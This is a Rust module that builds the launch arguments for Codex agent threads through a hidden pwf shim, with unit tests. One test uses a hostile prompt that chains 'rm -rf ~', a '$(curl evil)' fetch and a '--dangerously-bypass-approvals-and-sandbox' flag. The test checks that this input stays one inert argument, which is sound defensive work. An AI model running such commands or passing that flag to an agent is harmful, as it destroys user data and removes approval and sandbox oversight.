//! Encodes Codex launches through pwf's hidden thread-title shim.

use std::time::{SystemTime, UNIX_EPOCH};

use pwf_application::pending_work::session::AgentLaunch;

#[doc(hidden)]
pub const LAUNCH_COMMAND: &str = "__codex-thread-title";
#[doc(hidden)]
pub const WORKER_COMMAND: &str = "__codex-thread-title-worker";
#[doc(hidden)]
pub const BINARY: &str = "codex";
#[doc(hidden)]
pub const TITLE_FLAG: &str = "--title";
#[doc(hidden)]
pub const CWD_FLAG: &str = "--cwd";
#[doc(hidden)]
pub const SINCE_FLAG: &str = "--since";
#[doc(hidden)]
pub const ARG_SEPARATOR: &str = "--";

const PWF_FALLBACK_BINARY: &str = "pwf";

pub(super) fn launch_argv(launch: &AgentLaunch) -> Vec<String> {
    thread_title_launch_argv(
        launch.title.clone(),
        launch.repository.clone(),
        launch.prompt.clone(),
    )
}

/// Builds the hidden pwf shim invocation that launches and names one Codex thread.
#[must_use]
#[doc(hidden)]
pub fn thread_title_launch_argv(title: String, cwd: String, prompt: String) -> Vec<String> {
    let mut argv = vec![
        current_pwf_exe(),
        LAUNCH_COMMAND.to_string(),
        TITLE_FLAG.to_string(),
        title,
        CWD_FLAG.to_string(),
        cwd,
        SINCE_FLAG.to_string(),
        now_unix_seconds().to_string(),
        ARG_SEPARATOR.to_string(),
        BINARY.to_string(),
        ARG_SEPARATOR.to_string(),
    ];
    argv.push(prompt);
    argv
}

fn current_pwf_exe() -> String {
    std::env::current_exe().ok().map_or_else(
        || PWF_FALLBACK_BINARY.to_string(),
        |path| path.to_string_lossy().into_owned(),
    )
}

fn now_unix_seconds() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

#[cfg(test)]
mod tests {
    use pwf_application::pending_work::session::Agent;

    use super::*;

    fn launch() -> AgentLaunch {
        AgentLaunch {
            agent: Agent::Codex,
            task_id: "PWF-0068".to_string(),
            title: "PWF-0068 - codex dispatch".to_string(),
            repository: "/repo".to_string(),
            prompt: "Pending-work ID: PWF-0068\nProject: pwf\n\ndo PWF-0068".to_string(),
            model: None,
        }
    }

    #[test]
    fn builds_title_shim_argv_with_guarded_codex_prompt() {
        let prepared = launch();

        let argv = launch_argv(&prepared);

        assert_eq!(argv[1], LAUNCH_COMMAND);
        assert!(argv.contains(&prepared.title));
        assert!(argv.contains(&prepared.repository));
        let codex_position = argv.iter().position(|argument| argument == BINARY).unwrap();
        assert_eq!(argv[codex_position + 1], ARG_SEPARATOR);
        assert_eq!(argv[codex_position + 2], prepared.prompt);
        assert_eq!(argv.last(), Some(&prepared.prompt));
    }

    #[test]
    fn model_is_not_encoded_for_codex() {
        let mut prepared = launch();
        prepared.model = Some("ignored".to_string());

        let argv = launch_argv(&prepared);

        assert!(!argv.contains(&"--model".to_string()));
        assert!(!argv.contains(&"ignored".to_string()));
    }

    #[test]
    fn hostile_prompt_stays_one_inert_element() {
        let mut prepared = launch();
        prepared.prompt =
            "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox".to_string();

        let argv = launch_argv(&prepared);

        let codex_position = argv.iter().position(|argument| argument == BINARY).unwrap();
        assert_eq!(argv[codex_position + 1], ARG_SEPARATOR);
        assert_eq!(argv[codex_position + 2], prepared.prompt);
        assert_eq!(argv.last(), Some(&prepared.prompt));
    }
}
